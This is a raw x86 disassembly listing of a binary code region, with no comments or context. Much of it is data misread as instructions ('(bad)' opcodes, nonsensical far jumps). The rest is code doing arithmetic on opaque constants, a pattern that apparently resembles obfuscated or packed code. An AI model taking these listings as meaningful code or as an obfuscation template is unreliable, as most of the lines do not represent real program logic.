  4108f4:	inc    esp
  4108f5:	inc    ebp
  4108f6:	(bad)  
  4108f7:	int    0x87
  4108f9:	jl     0x4108bb
  4108fb:	pop    ss
  4108fc:	or     eax,0x2cd77467
  410901:	jno    0x4108f2
  410903:	nop
  410904:	cmp    DWORD PTR [eax-0x218be218],esi
  41090a:	add    ebx,ebx
  41090c:	push   esp
  41090d:	les    esp,FWORD PTR [eax+0x64]
  410910:	sbb    BYTE PTR [ebx+0x42],ch
  410913:	arpl   WORD PTR [eax+ebx*8-0x30],dx
  410917:	test   DWORD PTR [ebp+0x59c6e98],esp
  41091d:	push   ebx
  41091e:	cld    
  41091f:	add    BYTE PTR [ebp+0x26],bh
  410922:	dec    ecx
  410923:	arpl   sp,dx
  410925:	pop    esi
  410926:	outs   dx,BYTE PTR ds:[esi]
  410927:	xchg   edx,eax
  410928:	iret   
  410929:	nop
  41092a:	sub    eax,0x68a951d6
  41092f:	fdivr  DWORD PTR [edx]
  410931:	mul    BYTE PTR [esp+ebx*4-0x6a]
  410935:	push   ebx
  410936:	mov    al,0x5c
  410938:	fdiv   st,st(1)
  41093a:	lsl    edi,WORD PTR [edx+ebp*8+0x1a]
  41093f:	bound  eax,QWORD PTR [ebp+0x5]
  410942:	xor    al,0xd5
  410944:	mov    ecx,0xe2267419
  410949:	fst    QWORD PTR [ebx]
  41094b:	imul   ecx,DWORD PTR [esi+0x33bf9105],0x6a2cf2cb
  410955:	sub    BYTE PTR [edx-0x4d],ah
  410958:	ret    0xec98
  41095b:	fcmovnb st,st(5)
  41095d:	repnz (bad) 
  410960:	mov    esp,0x77dd8f0e
  410965:	and    esp,DWORD PTR [esi+0x49e11d0b]
  41096b:	pusha  
  41096c:	out    0xda,al
  41096e:	arpl   WORD PTR [ebx-0x565cc35a],dx
  410974:	xchg   esp,eax
  410975:	jae    0x4109dc
  410977:	jp     0x4109de
  410979:	jmp    0x410969
  41097b:	mov    edx,0x778b52aa
  410980:	jnp    0x41099e
  410982:	sub    ch,BYTE PTR [ebx-0x71]
  410985:	sbb    ebp,DWORD PTR [eax-0x71]
  410988:	dec    BYTE PTR [edi+0x7f]
  41098b:	rol    BYTE PTR [esp+edi*2+0x7b],0x60
  410990:	mov    al,0x53
  410992:	sbb    ebp,esp
  410994:	push   ebp
  410995:	bound  ebp,QWORD PTR [edx]
  410997:	pop    esi
  410998:	push   eax
  410999:	outs   dx,BYTE PTR ds:[esi]
  41099a:	push   ebp
  41099b:	push   ds
  41099c:	rol    ecx,1
  41099e:	mov    al,0x2c
  4109a0:	stos   BYTE PTR es:[edi],al
  4109a1:	push   ebx
  4109a2:	or     BYTE PTR [eax+eax*1],bl
  4109a5:	popf   
  4109a6:	jns    0x410947
  4109a8:	and    BYTE PTR [esi],0x87
  4109ab:	(bad)  
  4109ac:	push   esi
  4109ad:	icebp  
  4109ae:	mov    ds:0xf610b681,al
  4109b3:	int    0xf6
  4109b5:	ficomp DWORD PTR [esi-0x53c744cd]
  4109bb:	or     eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x42206a
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x42206a
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0x70917683
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [edi],dl
  410a7d:	(bad)  
  410a7e:	out    dx,al
  410a7f:	cs jge 0x410a53
  410a82:	sahf   
  410a83:	out    dx,al
  410a84:	out    0x9c,eax
  410a86:	popa   
  410a87:	or     BYTE PTR [ebp-0x197d657e],bh
  410a8d:	out    dx,eax
  410a8e:	inc    edi
  410a8f:	daa    
  410a90:	das    
  410a91:	sti    
  410a92:	mov    ds:0xd8233ff5,al
  410a97:	ret    0x5a
  410a9a:	repnz inc ebp
  410a9c:	adc    esi,esp
  410a9e:	sbb    esi,ebp
  410aa0:	mov    edi,0x47589c01
  410aa5:	ficom  WORD PTR [esi-0x7]
  410aa8:	sub    BYTE PTR [esi],cl
  410aaa:	mov    edi,DWORD PTR [edi]
  410aac:	call   0x5157:0x70228ce0
  410ab3:	mov    bh,0x6a
  410ab5:	rcl    BYTE PTR [ebx+0x6f8a588a],cl
  410abb:	mov    ebx,0x70eedded
  410ac1:	pop    es
  410ac2:	(bad)  
  410ac4:	or     DWORD PTR ds:0x7fdee244,esp
  410aca:	pop    esp
  410acb:	sbb    edx,DWORD PTR [esi+ebx*2+0x41]
  410acf:	adc    cl,bl
  410ad1:	pop    esi
  410ad2:	and    DWORD PTR [eax-0x4a],esi
  410ad5:	xchg   esp,eax
  410ad6:	loopne 0x410b54
  410ad8:	and    eax,0x38bc90fc
  410add:	pop    ebp
  410ade:	add    al,0xde
  410ae0:	call   0x1856:0xcd894342
  410ae7:	sahf   
  410ae8:	or     al,0xc5
  410aea:	xchg   esi,eax
  410aeb:	xchg   BYTE PTR [ebp-0x3f],al
  410aee:	xor    al,BYTE PTR [ebp-0x31]
  410af1:	mov    cl,0x7c
  410af3:	adc    al,0x19
  410af5:	jle    0x410b1f
  410af7:	sub    BYTE PTR ds:0x52b59f96,cl
  410afd:	lock mov ebx,0x85ae3eea
  410b03:	push   0xc0865700
  410b08:	cmp    eax,0xc8bb5445
  410b0d:	shl    BYTE PTR [ebx+0x7aa7de0],cl
  410b13:	popf   
  410b14:	mov    es,edi
  410b16:	ret    
  410b17:	stos   DWORD PTR es:[edi],eax
  410b18:	jp     0x410ab5
  410b1a:	mov    edi,0x686c436d
  410b1f:	jp     0x410ad3
  410b21:	popa   
  410b22:	xor    al,0x69
  410b24:	add    BYTE PTR [ebx+ecx*2-0x5e],cl
  410b28:	popa   
  410b29:	fisubr DWORD PTR [ebx-0x2a]
  410b2c:	fisubr WORD PTR [ebx]
  410b2e:	or     eax,0x2c7acf39
  410b33:	xchg   esi,eax
  410b34:	add    bl,BYTE PTR [esi]
  410b36:	ins    BYTE PTR es:[edi],dx
  410b37:	and    edi,ebx
  410b39:	in     eax,0x3d
  410b3b:	stos   DWORD PTR es:[edi],eax
  410b3c:	sbb    eax,0xf3647064
  410b41:	pop    es
  410b42:	icebp  
  410b43:	test   eax,0x296fefff
  410b48:	fst    QWORD PTR [esi-0x6d]
  410b4b:	mov    edi,0xc2c786cf
  410b50:	scas   al,BYTE PTR es:[edi]
  410b51:	pop    edx
  410b52:	dec    ecx
  410b53:	xchg   esp,eax
  410b54:	jbe    0x410b03
  410b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b57:	nop
  410b58:	pop    edx
  410b59:	xchg   ecx,eax
  410b5a:	xchg   BYTE PTR [ecx+0x75],dl
  410b5d:	shr    DWORD PTR [ecx+0x31386a69],1
  410b63:	cmp    BYTE PTR [ecx-0x3f],dl
  410b66:	out    dx,eax
  410b67:	mov    ebx,esp
  410b69:	adc    eax,0xdb6e00fc
  410b6e:	and    al,0x2d
  410b70:	test   eax,0x27867c6a
  410b75:	inc    edi
  410b76:	jnp    0x410b74
  410b78:	cwde   
  410b79:	mov    WORD PTR [esi-0x109006a5],?
  410b7f:	mov    ds:0xa3301cc7,al
  410b84:	mov    WORD PTR [ebx-0x4d],ss
  410b87:	mov    eax,0x29e44e66
  410b8c:	lds    edi,FWORD PTR [ebp+0xc4a0c7d]
  410b92:	nop
  410b93:	xchg   esp,eax
  410b94:	pop    esi
  410b95:	xchg   DWORD PTR [eax-0x2e],edx
  410b98:	ficomp WORD PTR [ebp+0x66]
  410b9b:	aas    
  410b9c:	stos   DWORD PTR es:[edi],eax
  410b9d:	ficomp DWORD PTR [ecx+esi*1+0x63e3946d]
  410ba4:	mov    ah,0x25
  410ba6:	mov    ch,0xc3
  410ba8:	jb     0x410b4c
  410baa:	mov    ?,WORD PTR [edi-0x6b305ee2]
  410bb0:	retf   0x9d0c
  410bb3:	in     eax,0x4f
  410bb5:	arpl   sp,di
  410bb7:	fs pop esp
  410bb9:	push   0x65699eb6
  410bbe:	gs add eax,0xfff6de75
  410bc4:	add    ecx,eax
  410bc6:	xor    eax,DWORD PTR [edi]
  410bc8:	cmp    BYTE PTR [ecx],0x7b
  410bcb:	mov    ds:0xb3553321,eax
  410bd0:	xchg   ebp,eax
  410bd1:	mov    edi,0x35a911b8
  410bd6:	stos   BYTE PTR es:[edi],al
  410bd7:	es mov edi,0x8251f1f8
  410bdd:	les    ebx,FWORD PTR ds:0x3ea46a4b
  410be3:	aaa    
  410be4:	repnz (bad) 
  410be6:	mov    esi,0x70ab678b
  410beb:	test   BYTE PTR [eax],ch
  410bed:	loop   0x410c14
  410bef:	jmp    0x1105897a
  410bf4:	add    eax,0xf14942a6
  410bf9:	jge    0x410c41
  410bfb:	iret   
  410bfc:	retf   
  410bfd:	test   DWORD PTR [eax+edx*1-0x21dae6a0],ecx
  410c04:	mov    esi,0xb6312446
  410c09:	pop    ds
  410c0a:	add    eax,0x9810e59e
  410c0f:	pop    ds
  410c10:	mov    bh,0xf9
  410c12:	in     al,dx
  410c13:	push   0xffffff94
  410c15:	test   eax,0x9839f30a
  410c1a:	push   ecx
  410c1b:	add    edx,DWORD PTR [edi+0x3e199a63]
  410c21:	ss push edi
  410c23:	adc    BYTE PTR [ecx-0x5b057832],dl
  410c29:	xchg   esi,eax
  410c2a:	aas    
  410c2b:	clc    
  410c2c:	dec    eax
  410c2d:	mov    bl,0xc9
  410c2f:	xchg   ebp,eax
  410c30:	fucom  st(2)
  410c32:	xor    eax,0x16a3b6a9
  410c37:	in     eax,dx
  410c38:	aaa    
  410c39:	mov    BYTE PTR ds:0x1a128c74,bl
  410c3f:	cli    
  410c40:	out    0xdc,eax
  410c42:	mov    WORD PTR [edi+edi*1-0x4a],?
  410c46:	jmp    0x410c91
  410c48:	loope  0x410c6e
  410c4a:	push   ecx
  410c4b:	pop    edx
  410c4c:	(bad)  
  410c4d:	retf   0x1df3
  410c50:	enter  0xe1b9,0xd8
  410c54:	outs   dx,BYTE PTR ds:[esi]
  410c55:	dec    ebp
  410c56:	jle    0x410c78
  410c58:	in     al,0x33
  410c5a:	xor    eax,0xfab6af57
  410c5f:	aas    
  410c60:	push   ss
  410c61:	sti    
  410c62:	add    edx,eax
  410c64:	mov    ecx,0x6d4c0133
  410c69:	adc    eax,esp
  410c6b:	pop    ds
  410c6c:	(bad)  
  410c6d:	fdivr  DWORD PTR fs:[esi-0x27]
  410c71:	push   ds
  410c72:	ret    
  410c73:	jo     0x410cde
  410c75:	sbb    al,0xc7
  410c77:	fistp  WORD PTR [esi+edi*2]
  410c7a:	sbb    DWORD PTR [esi-0x1de8b29c],esp
  410c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c81:	jg     0x410c08
  410c83:	jno    0x410c45
  410c85:	iret   
  410c86:	adc    eax,0xd8ead23c
  410c8b:	pop    ss
  410c8c:	xchg   ebx,eax
  410c8d:	add    BYTE PTR [ebx],dh
  410c8f:	push   cs
  410c90:	ds rcr al,0xc9
  410c94:	mov    ebx,0x6e65dc28
  410c99:	ds dec eax
  410c9b:	nop
  410c9c:	or     dh,dh
  410c9e:	imul   esp,DWORD PTR [ebp+0x61f468c2],0x4911049d
  410ca8:	out    dx,al
  410ca9:	mov    ebx,0xfc687da5
  410cae:	inc    edx
  410caf:	call   0xa0cd:0xa313008c
  410cb6:	(bad)  
  410cb7:	pop    ecx
  410cb8:	sbb    DWORD PTR [edx-0x4d12d841],edi
  410cbe:	adc    edx,edx
  410cc0:	mov    ah,0xef
  410cc2:	push   ebp
  410cc3:	ficomp WORD PTR [eax]
  410cc5:	push   ss
  410cc6:	add    edx,ecx
  410cc8:	aad    0xef
  410cca:	pop    esi
  410ccb:	xchg   DWORD PTR [edx+ebp*2-0x12],ebp
  410ccf:	imul   eax,DWORD PTR [ebx-0x7560a7f1],0xffffff90
  410cd6:	cs or  al,0x48
  410cd9:	xchg   edi,eax
  410cda:	imul   BYTE PTR [ecx]
  410cdc:	in     eax,dx
  410cdd:	xchg   ebp,esp
  410cdf:	int3   
  410ce0:	inc    esp
  410ce1:	or     BYTE PTR [edi+0x15cf67c9],bh
  410ce7:	retf   
  410ce8:	pop    ebp
  410ce9:	ins    DWORD PTR es:[edi],dx
  410cea:	inc    ebp
  410ceb:	sbb    DWORD PTR [ebp-0x5e],ebx
  410cee:	ins    BYTE PTR es:[edi],dx
  410cef:	sub    cl,BYTE PTR [ecx+0x4b2e5a42]
  410cf5:	xor    edx,edx
  410cf7:	test   al,0xef
  410cf9:	minps  xmm2,XMMWORD PTR [edx-0x5793ca3f]
  410d00:	sbb    al,0xc5
  410d02:	jb     0x410c9a
  410d04:	pop    es
  410d05:	mov    es,WORD PTR [esp+ebx*8-0x6b7abf39]
  410d0c:	mov    al,0x94
  410d0e:	sahf   
  410d0f:	xchg   esp,eax
  410d10:	dec    ebp
  410d11:	sbb    DWORD PTR [esi+0x7a],esp
  410d14:	sti    
  410d15:	repnz xor ah,ch
  410d18:	ds mov eax,0x9e10a225
  410d1e:	and    ch,dl
  410d20:	neg    BYTE PTR [ebx-0x62045fb]
  410d26:	sbb    esp,eax
  410d28:	jnp    0x410d41
  410d2a:	dec    edi
  410d2b:	repnz mov edi,0x955329e0
  410d31:	mov    ds:0x259645aa,al
  410d36:	inc    eax
  410d37:	sahf   
  410d38:	cmp    DWORD PTR [ebx-0x67e410d1],esi
  410d3e:	mov    bh,0x89
  410d40:	jge    0x410d3e
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffffb3
  410d65:	stos   DWORD PTR es:[edi],eax
  410d66:	aad    0xbc
  410d68:	ins    DWORD PTR es:[edi],dx
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0xfd95:0x59181814
  410d73:	loope  0x410d44
  410d75:	add    dl,BYTE PTR [edi-0x74b33a0e]
  410d7b:	mov    edx,0xe502e56c
  410d80:	mul    bl
  410d82:	pop    ss
  410d83:	mov    BYTE PTR [eax-0x55],bh
  410d86:	or     bl,BYTE PTR [edx+ebx*2]
  410d89:	push   eax
  410d8a:	jmp    0x5c94f1df
  410d8f:	loop   0x410df0
  410d91:	test   BYTE PTR [ebp+0x6],ah
  410d94:	mov    edi,0x1f5925e8
  410d99:	push   esp
  410d9a:	enter  0x90b3,0xbd
  410d9e:	push   ss
  410d9f:	jbe    0x410d86
  410da1:	and    DWORD PTR [eax],edi
  410da3:	xchg   ebp,eax
  410da4:	jecxz  0x410ddd
  410da6:	seta   BYTE PTR [ebx]
  410da9:	pop    ebx
  410daa:	or     DWORD PTR [ecx+0x1a],edx
  410dad:	jo     0x410d90
  410daf:	jae    0x410d47
  410db1:	aam    0xf3
  410db3:	mov    ecx,0xc3223906
  410db8:	mov    DWORD PTR [esi],ebx
  410dba:	jmp    0xcde:0xb341aba6
  410dc1:	retf   0x60
  410dc4:	dec    eax
  410dc5:	jg     0x410de2
  410dc7:	sti    
  410dc8:	cwde   
  410dc9:	je     0x410d97
  410dcb:	fdivp  st(7),st
  410dcd:	inc    ebp
  410dce:	(bad)  
  410dcf:	clc    
  410dd0:	mov    esi,0x14b40fa2
  410dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dd6:	jge    0x410daa
  410dd8:	mov    ebp,0xcbdf268d
  410ddd:	std    
  410dde:	rol    DWORD PTR [ecx-0x23fbce7c],1
  410de4:	jb     0x410d79
  410de6:	and    dh,BYTE PTR [edi+0x2b]
  410de9:	aaa    
  410dea:	and    bh,ah
  410dec:	push   ss
  410ded:	inc    eax
  410dee:	add    dh,0xc4
  410df1:	ins    DWORD PTR es:[edi],dx
  410df2:	cmp    dl,ah
  410df4:	pop    ss
  410df5:	ret    
  410df6:	pop    edi
  410df7:	rol    al,0x86
  410dfa:	pop    edi
  410dfb:	rcr    bl,0x70
  410dfe:	sub    al,0xb5
  410e00:	mov    BYTE PTR [edi+0x65],ch
  410e03:	mov    ss,WORD PTR [ebp+edx*1+0x7361bade]
  410e0a:	inc    ecx
  410e0b:	repnz or al,0x25
  410e0e:	fild   DWORD PTR [ebp+edx*4-0x20]
  410e12:	mov    bl,0x55
  410e14:	in     al,dx
  410e15:	test   dh,bl
  410e17:	sbb    al,0x50
  410e1a:	sub    DWORD PTR [edi-0x3bbbf83e],eax
  410e20:	test   BYTE PTR [ecx-0x3fe2435f],dh
  410e26:	les    ebx,FWORD PTR [ecx+0x75]
  410e29:	enter  0x52af,0xe6
  410e2d:	jno    0x410e10
  410e2f:	cli    
  410e30:	in     al,0x70
  410e32:	adc    bl,bh
  410e34:	adc    cl,BYTE PTR [esi]
  410e36:	pop    eax
  410e37:	gs loope 0x410e7f
  410e3a:	push   esp
  410e3b:	mov    bl,0xeb
  410e3d:	stos   DWORD PTR es:[edi],eax
  410e3e:	popf   
  410e3f:	inc    edi
  410e40:	loopne 0x410e09
  410e42:	sub    bh,BYTE PTR [ebx+ecx*2+0xe]
  410e46:	xlat   BYTE PTR ds:[ebx]
  410e47:	pop    esi
  410e48:	mov    ebx,0xf15ee4ea
  410e4d:	push   ss
  410e4e:	shl    BYTE PTR [esi-0x50],cl
  410e51:	lods   al,BYTE PTR ds:[esi]
  410e52:	mov    cl,0x8b
  410e54:	popf   
  410e55:	mov    ecx,ebp
  410e57:	arpl   bp,cx
  410e59:	inc    ecx
  410e5a:	out    0xf8,al
  410e5c:	cmp    edi,DWORD PTR [ecx+0x3d]
  410e5f:	cli    
  410e60:	mov    dl,0x65
  410e62:	mov    edi,0x146df909
  410e67:	cmp    eax,0xd763e1f2
  410e6c:	stc    
  410e6d:	pop    ecx
  410e6e:	add    al,0xf2
  410e70:	inc    edi
  410e71:	push   ebp
  410e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e73:	jle    0x410e9c
  410e75:	pop    ebp
  410e76:	xor    ebp,DWORD PTR [esi+0x7c8ffcf0]
  410e7c:	imul   esi,DWORD PTR [ebx-0x5f],0xffffff8e
  410e80:	cs jmp 0xe680cfd4
  410e86:	jle    0x410e28
  410e88:	in     al,0xd3
  410e8a:	loope  0x410e87
  410e8c:	xor    esi,edx
  410e8e:	pop    DWORD PTR [edi+ecx*8+0x26]
  410e92:	cmc    
  410e93:	lds    esp,FWORD PTR [eax+0x6cdb5a5b]
  410e99:	pop    ebx
  410e9a:	sbb    ebx,DWORD PTR [ecx]
  410e9c:	lods   al,BYTE PTR ds:[esi]
  410e9d:	enter  0x373d,0x1a
  410ea1:	rcl    BYTE PTR [ecx-0x77],0xec
  410ea5:	mov    bl,0xe1
  410ea7:	push   edx
  410ea8:	xchg   edx,eax
  410ea9:	retf   
  410eaa:	cmc    
  410eab:	or     al,0xf4
  410ead:	dec    ebx
  410eae:	mov    edx,0x77ac5017
  410eb3:	stos   BYTE PTR es:[edi],al
  410eb4:	popf   
  410eb5:	and    DWORD PTR [ebp-0x22],0x4
  410eb9:	dec    esi
  410eba:	jnp    0x410ed7
  410ebc:	test   al,0x2
  410ebe:	cmp    BYTE PTR [edx],ch
  410ec0:	addr16 fscale 
  410ec3:	loop   0x410f17
  410ec5:	mov    cl,0x24
  410ec7:	mov    ecx,0xe3485cf2
  410ecc:	and    dh,BYTE PTR [edi]
  410ece:	adc    al,0xcf
  410ed0:	add    al,0xd0
  410ed2:	mov    al,0xfd
  410ed4:	fld    QWORD PTR [edi-0x94848d8]
  410eda:	or     BYTE PTR [edx-0x11df9e52],0xdf
  410ee1:	mov    bh,0xc3
  410ee3:	sub    ecx,edi
  410ee5:	loope  0x410e7a
  410ee7:	sbb    al,0x8f
  410ee9:	out    dx,eax
  410eea:	ss cmc 
  410eec:	loopne 0x410eeb
  410eee:	iret   
  410eef:	arpl   WORD PTR [eax-0xcecb0c8],di
  410ef5:	adc    al,0xa6
  410ef7:	dec    ecx
  410ef8:	mov    ebx,?
  410efa:	ret    
  410efb:	mov    es,edx
  410efd:	int3   
  410efe:	ins    BYTE PTR es:[edi],dx
  410eff:	lds    esp,FWORD PTR [edx+0x1f]
  410f02:	mov    esi,0x55228b24
  410f07:	add    DWORD PTR [ebx-0x74],edx
  410f0a:	mov    dh,0xaf
  410f0c:	or     DWORD PTR [esi+0xb8e57fa],edx
  410f12:	stos   DWORD PTR es:[edi],eax
  410f13:	stos   DWORD PTR es:[edi],eax
  410f14:	jg     0x410f68
  410f16:	fidivr WORD PTR [eax]
  410f18:	jb     0x410f0f
  410f1a:	pop    ebp
  410f1b:	call   0x5d3f7b06
  410f20:	cmp    eax,DWORD PTR [esp]
  410f23:	ss pop ecx
  410f25:	pushf  
  410f26:	ins    BYTE PTR es:[edi],dx
  410f27:	or     al,0xc4
  410f29:	pushf  
  410f2a:	cli    
  410f2b:	mov    ch,0x55
  410f2d:	(bad)  
  410f2e:	jle    0x410f23
  410f30:	mov    al,ds:0xec9a031
  410f35:	vcvtss2si esp,DWORD PTR [edi-0x5de53997]
  410f3d:	pop    ebx
  410f3e:	xchg   BYTE PTR [ebp+0x78],cl
  410f41:	ds in  al,dx
  410f43:	ficom  DWORD PTR [esi]
  410f45:	cmp    eax,DWORD PTR [esi]
  410f47:	pop    esp
  410f48:	ret    
  410f49:	jg     0x410f5e
  410f4b:	xlat   BYTE PTR ds:[ebx]
  410f4c:	fldenv [eax+0x32ce3bed]
  410f52:	mov    esi,eax
  410f54:	rcl    esp,1
  410f56:	or     BYTE PTR [ebp+ecx*8+0x66],cl
  410f5a:	ds pop ebp
  410f5c:	(bad)  
  410f5d:	test   DWORD PTR [eax+0x7ce165f7],ecx
  410f63:	cmp    eax,DWORD PTR [edx+0x4b572c12]
  410f69:	push   eax
  410f6a:	mov    eax,0x69783237
  410f6f:	popa   
  410f70:	int3   
  410f71:	fild   QWORD PTR fs:[esi]
  410f74:	shl    BYTE PTR [edi+0x1929c247],1
  410f7a:	mov    bh,0x1e
  410f7c:	cmp    al,0xd4
  410f7e:	pop    ecx
  410f7f:	nop
  410f80:	bound  eax,QWORD PTR [ebx]
  410f82:	dec    ecx
  410f83:	and    DWORD PTR [ecx+0x17],esp
  410f86:	out    dx,eax
  410f87:	push   ebx
  410f88:	xor    edx,DWORD PTR [eax+0x62d6cc39]
  410f8e:	xchg   ebx,eax
  410f8f:	push   ecx
  410f90:	js     0x410fd5
  410f92:	xchg   esp,eax
  410f93:	pop    eax
  410f94:	lods   al,BYTE PTR ds:[esi]
  410f95:	mov    DWORD PTR [esi],edx
  410f97:	(bad)  
  410f99:	mov    WORD PTR [ecx+0x36],?
  410f9c:	sub    al,0x5e
  410f9e:	sub    esp,DWORD PTR [ebx]
  410fa0:	inc    edi
  410fa1:	ret    
  410fa2:	cwde   
  410fa3:	mov    al,ds:0xfb982a9
  410fa8:	xor    al,0x11
  410faa:	xchg   edx,eax
  410fab:	hlt    
  410fac:	pop    ss
  410fad:	mov    es,WORD PTR [edi+0x26]
  410fb0:	xchg   edx,eax
  410fb1:	ret    0x12f5
  410fb4:	or     BYTE PTR [edi],dh
  410fb6:	mov    dh,0x20
  410fb8:	(bad)  
  410fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fbb:	xor    DWORD PTR [ebp+0x6395e915],edi
  410fc1:	shr    BYTE PTR [ecx+0x7f9ca8c9],1
  410fc7:	ror    DWORD PTR ds:[edx],0x74
  410fcb:	xchg   edx,eax
  410fcc:	inc    ecx
  410fcd:	mov    eax,ds:0xbb77c4e4
  410fd2:	and    eax,esi
  410fd4:	adc    DWORD PTR gs:[ecx-0x46b536ae],ebx
  410fdb:	mov    ds:0xa0124cdd,eax
  410fe0:	mov    edi,0x8507ed6f
  410fe5:	inc    esp
  410fe6:	fnstenv [esi+0x70]
  410fe9:	sbb    eax,0xcb65f466
  410fee:	cld    
  410fef:	and    eax,0x8179275c
  410ff4:	bound  ebp,QWORD PTR [esi+ebp*2]
  410ff7:	cmp    al,0x90
  410ff9:	test   eax,0xd4952b49
  410ffe:	mov    WORD PTR [edx+0x28c8d90],es
  411004:	in     al,0xa1
  411006:	add    al,0x5c
  411008:	arpl   di,dx
  41100a:	scas   eax,DWORD PTR es:[edi]
  41100b:	mov    bh,al
  41100d:	stos   DWORD PTR es:[edi],eax
  41100e:	or     edx,ebx
  411010:	imul   ebx,eax,0x2b51454f
  411016:	outs   dx,DWORD PTR ds:[esi]
  411017:	inc    esp
  411018:	jns    0x41106b
  41101a:	jns    0x410ff8
  41101c:	sub    al,0x63
  41101e:	out    0xd,al
  411020:	push   0x47a64c74
  411025:	js     0x41105a
  411027:	dec    ecx
  411028:	fisub  DWORD PTR [edi+0x59]
  41102b:	pop    eax
  41102c:	jb     0x410fbd
  41102e:	mov    dh,0x27
  411030:	mov    BYTE PTR [ecx],ch
  411032:	retf   
  411033:	mov    ecx,DWORD PTR [ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
